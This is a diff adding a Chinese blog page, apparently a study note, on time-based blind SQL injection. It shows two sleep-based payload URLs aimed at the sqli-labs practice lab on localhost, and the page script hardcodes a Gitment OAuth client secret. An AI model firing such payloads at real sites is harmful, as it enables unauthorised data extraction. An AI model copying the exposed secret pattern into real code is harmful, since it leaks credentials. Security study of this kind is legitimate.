@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="心中有光の孩子">
+    <meta name="keyword"  content="tea9">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        1.3.2-SQL注入-SQL盲注-时间盲注 - tea9的博客 | tea9&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 努力活着 </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar">
+            <img src="/img/avatar.png" />
+        </div>
+        <div class="name">
+            <i>tea9</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#时间盲注"><span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#时间盲注原理"><span class="toc-text">时间盲注原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间盲注方法"><span class="toc-text">时间盲注方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#links"><span class="toc-text">links</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+        <div class="index-about-mobile">
+            <i> 努力活着 </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        1.3.2-SQL注入-SQL盲注-时间盲注
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2018-06-23 00:00:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#sql注入" title="sql注入">sql注入</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#sql盲注" title="sql盲注">sql盲注</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="时间盲注原理"><a href="#时间盲注原理" class="headerlink" title="时间盲注原理"></a>时间盲注原理</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/01.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/02.png" alt=""></p>
+<h3 id="时间盲注方法"><a href="#时间盲注方法" class="headerlink" title="时间盲注方法"></a>时间盲注方法</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/03.png" alt=""></p>
+<pre><code>http://localhost:90/Less-10/?id=1&quot; and if(left(user(),1)=&apos;a&apos;,0,sleep(3))--+
+
+http://localhost:90/Less-10/?id=1&quot; and if(left(select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&apos;r&apos;,0,sleep(3))--+
+</code></pre><p>时间注入脚本  </p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/04.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/06/05.png" alt=""></p>
+<hr>
+<h2 id="links"><a href="#links" class="headerlink" title="links"></a>links</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzNzExNzI5Ng==&amp;mid=2648732982&amp;idx=1&amp;sn=159f2b13d7737232577ae11ccecb33d2&amp;chksm=f0d95f29c7aed63f2e0aea215f57672f7282de08c47a1033e6b2cfe1fee5fb788b4c8de405c0&amp;mpshare=1&amp;scene=23&amp;srcid=0702v4QOmQfViIjUPqq98LAc" target="_blank" rel="noopener">时间盲注</a></p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        <li>
+            <a target="_blank" href="https://twitter.com/shaomiaosun">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-twitter"></i>
+                            </span>
+            </a>
+        </li>
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/tea9">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="https://www.10000h.top">10000H</a></span>
+        <span>/</span>
+        
+        <span><a href="https://niexiaotao.com">Xiaotao&#39;s Page</a></span>
+        <span>/</span>
+        
+        <span><a href="#">It helps SEO</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script src="/js/gitment.js"></script>
+<script>
+    var gitment = new Gitment({
+        id: '1.3.2-SQL注入-SQL盲注-时间盲注',
+        owner: 'tea9',
+        repo: 'tea9.github.io',
+        oauth: {
+            client_id: 'dd67fb84ddbc6cf9c112',
+            client_secret: 'be4e88389be3e45fbafbd7592148fa47feacaacf',
+        },
+    })
+    gitment.render('comment-container')
+</script>
+
+
+
+
+</html>
